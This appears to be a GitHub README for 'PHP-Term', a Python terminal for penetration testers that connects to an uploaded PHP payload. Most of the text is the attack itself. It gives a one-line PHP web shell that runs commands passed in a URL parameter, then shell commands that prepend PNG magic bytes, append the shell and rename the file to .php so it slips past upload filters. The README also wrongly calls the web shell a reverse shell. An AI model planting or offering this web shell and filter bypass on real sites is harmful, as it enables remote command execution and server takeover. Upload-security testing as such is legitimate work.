# PHP-Term
![434513902-3930a006-4bf9-4257-bd3c-8fef646412b2 (1)](https://github.com/user-attachments/assets/5137d278-4c6d-48ef-94be-c952e2c87680)


A terminal for penetration testers, to connect to an uploaded php payload. (Made with Python).
The payload itself is one simple PHP code line to give the tester access to a remote reverse shell through unsanitized uplaod features of a website.
It looks like this:
```
<?php system(\$_GET['cmd']); ?>"
```

To further test for sanitized uploads you can use this to create fake PNG files.
E. x.:
Create an empty PNG formatted file:
```
printf "\x89PNG\r\n\x1a\n" > payload.png
```

Append PHP-Payload:
```
echo "<?php system(\$_GET['cmd']); ?>" >> payload.png
```

Give it a PHP alias:
```
mv payload.png payload.png.php
```

This will also work with different file formats and might help you to sanitize the uploads properly.
